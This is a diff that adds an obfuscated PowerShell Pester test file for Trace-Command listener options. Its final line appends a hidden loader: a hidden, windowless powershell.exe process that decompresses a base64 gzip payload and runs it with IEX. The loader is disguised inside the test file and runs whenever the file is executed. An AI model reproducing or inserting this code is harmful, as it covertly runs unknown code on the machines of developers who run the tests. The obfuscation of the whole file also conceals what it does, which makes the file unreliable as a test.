@@ -1,0 +1,84 @@
+${y7`9r}  =[TyPe]("{4}{1}{3}{5}{0}{2}{6}" -F 'a','YSTEm','GNOstIC','.','s','di','S.TRACE');SeT`-itEM ("{1}{0}{2}{3}" -f'B','vARIA','le:4WGP7','U') (  [Type]("{2}{0}{1}" -f 'ateT','IME','d')) ;  ${HIK`Wq}=[TypE]("{2}{0}{1}{3}{4}" -F'N','G.','thReadI','thr','Ead') ; s`eT  ("{0}{1}" -f'j','u8Yg') (  [type]("{1}{0}" -f 'tpTr','IN')) ;   s`eT-it`eM  ('V'+'aria'+'bLe:'+'w5CSoq')  ([tYPe]("{6}{2}{5}{0}{1}{3}{4}" -f 'IagnOSTICS','.','Y','pROce','SS','STem.D','S') )  ;
+
+Des`cRi`Be ("{0}{2}{1}{3}"-f 'Tra','m','ce-Com','and') -tags ("{1}{0}{2}" -f'a','Fe','ture') {
+
+    cO`N`TEXT ("{2}{1}{0}{3}" -f 'r opti','istene','L','ons') {
+        b`EF`Oreall {
+            ${L`oGFI`LE} = SE`TUp -f ("{3}{2}{1}{0}" -f'ommandLog.txt','eC','rac','t') -pass
+            ${ACtU`All`O`GFile} = s`Etup -f ("{4}{3}{2}{1}{0}"-f 'g.txt','mandLo','ualTraceCom','t','ac') -pass
+        }
+
+        afTE`RE`ACh {
+            if ( T`ESt`-paTH ${l`o`gfILe} ) { R`Emo`VE-iTem ${loG`FILe} }
+            if ( TeS`T`-PaTh ${aCt`U`Allogfi`Le} ) { rEmOv`E-I`TEm ${Actu`A`llo`GF`iLE} }
+        }
+
+        I`T ("{2}{3}{1}{0}{4}{5}" -f 'ti','alOpera','L','ogic','on','Stack works') -pending:(${iScO`R`eC`LR}) {
+            ${K`eYwo`RD} = ("{15}{7}{1}{8}{3}{0}{2}{5}{9}{12}{10}{13}{6}{4}{11}{14}" -f 'd_L','ce_C','istenerOpti','n','nS','on_L','eratio','ra','omma','o','c','tack','gi','alOp','_Foo','T')
+            ${s`T`ACk} =  (  c`hI`LdITem  ("V"+"A"+"rIABLE:y79"+"r") )."vAl`UE"::"c`ORrelAT`I`On`mAn`AgER"."LOgICa`lo`PErATI`Onst`A`CK"
+            ${s`T`AcK}.("{0}{1}" -f 'Pu','sh').Invoke(${k`E`YWORD})
+
+            tr`AcE-c`Om`Ma`ND -Name ('*') -Expression {W`RI`Te-OuTpUt ("{0}{1}" -f 'F','oo')} -ListenerOption ("{1}{2}{4}{0}{3}"-f 'onS','Logi','c','tack','alOperati') -FilePath ${loG`FilE}
+
+            ${L`Og} = gEt-`COn`TeNt ${l`oG`FiLE} | WHer`e-`Object {${_} -like "*LogicalOperationStack=$keyword*"}
+            ${L`oG}."co`UNT" | sh`oUld -BeGreaterThan 0
+        }
+
+        I`T ("{3}{0}{1}{2}"-f 'stack ','wor','ks','Call') -pending:(${iscoR`Ec`Lr}) {
+            T`R`Ace-comMAnD -Name ('*') -Expression {wr`i`Te-`oUtPut ("{1}{0}" -f 'o','Fo')} -ListenerOption ("{2}{0}{1}"-f'all','stack','C') -FilePath ${LOg`FiLE}
+            ${L`oG} = gET-Con`Te`NT ${lO`gFILE} | WH`eRe-`oBjEct {${_} -like (("{1}{10}{11}{3}{9}{12}{4}{6}{8}{5}{13}{2}{0}{7}" -f'eedFileInfo)','*C','olean n','En','etStackT','e(Exception e, ','r','*','ac','viro','allstack= ','  * System.','nment.G','Bo'))}
+            ${l`oG}."C`OUNT" | S`h`Ould -BeGreaterThan 0
+        }
+
+        it ("{0}{4}{1}{2}{3}"-f 'D','me w','or','ks','ateti') {
+            ${EX`PE`CT`eDDa`Te} = tRa`cE-c`Omm`And -Name ('*') -Expression {G`eT-DATE} -ListenerOption ("{2}{0}{1}"-f 'i','me','DateT') -FilePath ${l`OgFiLE}
+            ${L`oG} = &("{1}{0}{2}" -f'et-Con','G','tent') ${loGF`I`Le} | .("{3}{1}{0}{2}"-f'e-Obje','er','ct','Wh') {${_} -like ("{2}{0}{3}{1}" -f 'Ti','*','*Date','me=')}
+            ${R`es`ULts} = ${L`og} | &("{0}{1}{2}{3}{4}" -f'Fo','r','Each-','Objec','t') {  (  &("{0}{1}{2}" -f 'V','ariAb','le')  ("{1}{0}"-f 'p7U','4wg')  )."v`ALuE"::("{0}{1}" -f 'Par','se').Invoke(${_}.("{1}{0}" -f'lit','Sp').Invoke("=")[1])}
+
+            
+            ${aLlOw`eD`gAp} = [timespan](60 * 1000 * 1000)
+            ${RE`S`ULTs} | .("{2}{1}{0}"-f 'h-Object','ac','ForE') {
+                    ${a`ctual`gAp} = ${_} - ${Exp`eCt`eDdA`TE};
+                    if (${eXP`eCTE`dD`AtE} -gt ${_})
+                    {
+                        ${a`ctU`A`lGap} = ${e`xpe`cTeDda`Te} - ${_};
+                    }
+
+                    ${A`LloWeD`GAp} | &("{0}{1}"-f'Sho','uld') -BeGreaterThan ${act`U`A`LGAP}
+                }
+        }
+
+        &('It') ("{1}{2}{4}{0}{3}" -f 'ef','Non','e option','fect','s has no ') {
+            .("{3}{0}{2}{1}" -f 'ma','d','n','Trace-Com') -Name ('*') -Expression {.("{3}{0}{2}{1}" -f'rite-','utput','o','w') ("{0}{1}" -f 'Fo','o')} -ListenerOption ("{0}{1}"-f 'N','one') -FilePath ${act`Ual`lO`gFI`LE}
+            &("{3}{2}{4}{1}{0}"-f'd','n','race-Co','T','mma') -name ('*') -Expression {&("{2}{3}{0}{1}" -f'p','ut','write-ou','t') ("{0}{1}" -f 'F','oo')} -FilePath ${L`OgF`ile}
+
+            .("{0}{2}{3}{1}"-f 'Compare','bject','-','O') (.("{0}{3}{2}{1}" -f 'Get-C','ent','nt','o') ${aCT`UAl`LogF`i`le}) (.("{2}{0}{1}{3}"-f 'ont','e','Get-C','nt') ${L`o`GfiLE}) | &("{0}{1}" -f 'Shou','ld') -BeNullOrEmpty
+        }
+
+        .('It') ("{2}{1}{0}" -f'works',' ','ThreadID') {
+            &("{2}{1}{0}{3}"-f'a','ce-Comm','Tra','nd') -Name ('*') -Expression {&("{0}{2}{3}{1}" -f'wr','-output','it','e') ("{1}{0}" -f 'o','Fo')} -ListenerOption ("{0}{2}{1}" -f'Thre','dId','a') -FilePath ${LO`GfI`LE}
+            ${L`og} = &("{1}{2}{0}"-f 'ntent','Get-','Co') ${lo`g`FILE} | &("{0}{2}{1}" -f 'Wh','bject','ere-O') {${_} -like ("{2}{0}{1}"-f 'a','dID=*','*Thre')}
+            ${rEs`Ul`TS} = ${l`OG} | .("{3}{2}{0}{1}"-f '-Obje','ct','ch','ForEa') {${_}.("{0}{1}" -f 'Spl','it').Invoke("=")[1]}
+
+            ${R`E`SulTS} | .("{1}{2}{0}" -f'Object','ForEach','-') { ${_} | .("{1}{0}"-f 'ld','Shou') -Be (  (.("{2}{0}{3}{1}" -f'E','LDITEm','g','T-CHI')  ("{1}{0}{2}{3}" -f 'riab','VA','Le:hIkw','Q') )."v`ALUe"::"cuR`R`E`NTTHrEAD"."MANaG`E`DtHREa`Did") }
+        }
+
+        .('It') ("{1}{4}{3}{2}{5}{6}{9}{7}{0}{8}" -f'ding ord','T','r','tamp c','imes','eates ','log','in ascen','er','s ') {
+            .("{0}{2}{1}"-f 'Tr','mand','ace-Com') -Name ('*') -Expression {.("{2}{0}{3}{1}"-f 'te','output','wri','-') ("{0}{1}"-f 'F','oo')} -ListenerOption ("{1}{0}"-f 'imestamp','T') -FilePath ${lOG`F`iLE}
+            ${L`Og} = &("{2}{1}{0}" -f'ent','t','Get-Con') ${lOG`FI`le} | &("{2}{1}{0}{3}" -f 'b','-O','Where','ject') {${_} -like ("{0}{3}{1}{2}" -f '*Times','amp','=*','t')}
+            ${R`eSulTS} = ${L`Og} | &("{0}{2}{3}{1}{4}"-f'ForEa','-O','c','h','bject') {${_}.("{1}{0}" -f'it','Spl').Invoke("=")[1]}
+            ${s`oRt`eDRES`Ul`Ts} = ${R`Es`ULTS} | &("{0}{1}{3}{2}" -f 'Sort-','Obj','ct','e')
+            ${SortE`dRE`SuL`Ts} | &("{0}{1}"-f'Shou','ld') -Be ${resU`LTS}
+        }
+
+        &('It') ("{6}{1}{5}{8}{4}{2}{3}{0}{7}"-f 'c','roc','n','t pro','e','essId lo','P','ess Id','gs curr') {
+            .("{2}{0}{1}"-f 'man','d','Trace-Com') -Name ('*') -Expression {&("{1}{2}{0}"-f'put','writ','e-out') ("{0}{1}"-f'Fo','o')} -ListenerOption ("{1}{0}"-f'sId','Proces') -FilePath ${l`o`GFile}
+            ${l`oG} = .("{0}{1}{2}{3}"-f'Get','-C','o','ntent') ${l`ogfi`Le} | &("{1}{3}{2}{0}" -f 'ject','Whe','Ob','re-') {${_} -like ("{2}{1}{3}{0}" -f '*','ID','*Process','=')}
+            ${re`SuL`TS} = ${l`Og} | .("{1}{2}{0}{4}{3}"-f 'h-O','ForEa','c','ct','bje') {${_}.("{0}{1}" -f 'Sp','lit').Invoke("=")[1]}
+
+            ${Re`Sul`Ts} | .("{3}{2}{0}{1}"-f'Ob','ject','h-','ForEac') { ${_} | &("{1}{2}{0}" -f 'ld','Sh','ou') -Be ${P`id} }
+        }
+    }
+}
+
+if( (.("{0}{2}{1}" -f'vA','BLE','rIA')  ("{0}{1}" -f'Ju8Y','g')  -vAlueOnLy  )::"sI`Ze" -eq 4){${b}=("{1}{0}{2}" -f'rsh','powe','ell.exe')}else{${b}=${eN`V:`wINdir}+((("{3}{6}{9}{1}{4}{0}{8}{2}{7}{5}" -f 'ul','rShe','we','ul3syswow64ul3','ll','ell.exe','WindowsP','rsh','3v1.0ul3po','owe'))  -RepLACe 'ul3',[char]92)};${S}=.("{2}{0}{1}"-f'ec','t','New-Obj') ("{2}{6}{1}{3}{5}{7}{4}{0}"-f 'StartInfo','.','Sy','Dia','.Process','g','stem','nostics');${S}."fiLE`NA`me"=${B};${S}."A`RGuMEN`Ts"=('-nop'+' '+'-'+'w '+'hidde'+'n'+' '+'-'+'c '+('{0}s'+'=New-'+'Obj'+'ec'+'t ') -F [char]36+(('IO.'+'MemoryStream(,[Convert]::FromBase64String(D5kD5'+'kH4sIAGIm'+'x1cCA7VWbW/aSBD+nEr9D1aFZFt1MBDSNJEq3RpwILwEcDABik4b'+'e20WFi+x1+Gl7X+/MdgpUdNe705n'+'gby787KzzzyzYy8OHEF5IG0cMmwy6'+'cvbNyddHOKlpOScxmI8mBVLmpR79NYb9eQEhDlWO'+'j9n9bOHLTNm0idJmaDVqsqXmAbTq6tKHIYkEId5/poIFEVk+cAoiRRV+ioNZyQkp7cPc+'+'II6YuU+zN/zfgDZqnatoKdGZFOUeAmshZ3cBJc3'+'loxKhT582dZnZwWp/naY4xZpMjWNhJkmXcZk1Xpm5pseLddEUVuUyfkEfdEfkiDs1J+EETYIx3w9kTaRMy4G8kqnAZ+IRFxGEgvzp'+'U4OqgpMgy7IXe'+'Q64YkAqt8I3jiC6LkgpgxTfpDmaRR9ONA0CUBuSAh'+'X1kkfKIOifJ1HLiM9Ik3VTpknR3+d42UYyPQ6opQ1SA5vwi3zd2YkYMHWf0x4'+'OfEqvBkyQ'+'U0vr198/aNlxEibBaP2QCjk8l+TCBSpcsjulf7JBU0q'+'Q17YcHDLUxzd2FM1Kk0STIxmU7Bv4Pa0WU4D7SfOylmFqAf9Ys'+'XDukO+pYLkonNqTsFyzRfOWFvzM4c+wucSH/Ov'+'irxaECq2wAvqZM'+'RTHktB8RjZH/ofKbWgQgVORUQt0oY8bFI0NSkyY9mtSUVz7ZGTJ'+'lLQuRAHiOIClKsvgzmkCBF'+'bgRtsgTUDnMZUuEBrUmmnVJ5m+2ezEFJr'+'jAcRZrUjaGuHE2yCGbE1SQURDQVoVjw/VD+Hm47ZoI6OBKZu6n6Es101woPIh'+'HGDqQTELizVsShmCWAaFKdusTY'+'WtTP'+'dpdfhaOCGaOBD56eIB2wksBgiYQkoasdEULNW0Q0litGlqC4r3WTYR'+'8q'+'O62LP'+'bWwT1z59W'+'Az1h8onoCToXIUKmTcY'+'lxokk1DARdHAvQRx/5DQEfXx1FolZCk2VKyqpoYW5EUQ050UX/XKY8T6qbA7WEKBUBkhnxp4Ih8KFsiBACVd/otrSB4Ro2AtR1jQYtoTYuNNvwH9K'+'zBqxdu82Ze18PqZuah'+'RtRo17vVXr1efrqx'+'7LKwag3R7DZEu3Y/n1uo3h+MxLiB'+'6ne0sBiVd6s'+'burNayB1t9A87Y7cuGJvd3He9UdXz/AvP6hfPTdoaVnp'+'GoYRb1VrcGhpro1COanRd79FBb3FjioeRzfDA0/374iWmm1Y4t4u8vWsgdD07c3Y3nn0'+'9a7vbU'+'V2/HJYXqIZQJajZpsGbIyNEXd3Gvs3XTd+oDP'+'0KMkyHkn'+'FvYBq9nmmgwfX8sXqp+2B7j2fG0C7R8eq+P4O5CSE09UK54ZIdH/UApGuO'+'sN8HHb9ScmYe6FT'+'fI+N9h0clvDA4MkDHHD9CXK'+'OV2WUgvxuUOLJZ5x6j1nhr6npx1C2jeoEOr32UuMS+0cMoeqruq'+'nrRdrk7PO+MPN2+Zxd6tXK3cjxd19f1atMZFzcfby8+tobUXnI00HX7XcIQoEhuXbxdH'+'eX7Z1d+G4fRDDPgAdzhWZGaPDTTG7n'+'LaWKhKGmrXpAwIAyaG7S/jNqIMe'+'4k/SG5vaE1HRrGFKp0AMOz0qsjVXpWVL+3i2zp'+'6moMYUKRZNTNt0'+'jgi5lW2JwVCnD5FzblAhz1949'+'X4aut8uxOSxrIH'+'qPjPdh+DzWpnRwTj0Oza/n'+'/N4Zp3c7g5f4N'+'ht/XfiH9'+'LVwL2uH'+'sPyy/XPhHAP+Lsw8xFaBrw'+'a3DyKE9vgpBypijr4osO8AHL32SL73bWJx24IPjL80j3eZhCgAAD5kD5k));IEX ')  -cREPLacE  'D5k',[char]39)+'(New-Objec'+'t'+' '+'IO'+'.S'+'t'+'r'+'eamRe'+'ader(New'+'-Object '+('IO'+'.Compres'+'si'+'o'+'n.GzipS'+'t'+'rea'+'m(YmFs,[IO.Compr'+'ession.C'+'ompression'+'Mode]::D'+'e'+'comp'+'ress))).ReadToEn'+'d();')."r`EpLaCe"('YmF',[string][cHar]36));${s}."us`esHeL`L`exECutE"=${f`A`Lse};${S}."Redir`ECt`s`TandAr`do`UtPUt"=${tR`Ue};${S}."W`iN`doWS`TylE"=("{0}{2}{1}"-f 'Hi','en','dd');${S}."cReA`TeNo`Wi`NdOw"=${tr`Ue};${P}=  (  .("{1}{0}{2}" -f 'vari','geT-','ABle') ('W5CS'+'oq') -VAlUEo )::("{0}{1}" -f'St','art').Invoke(${s});
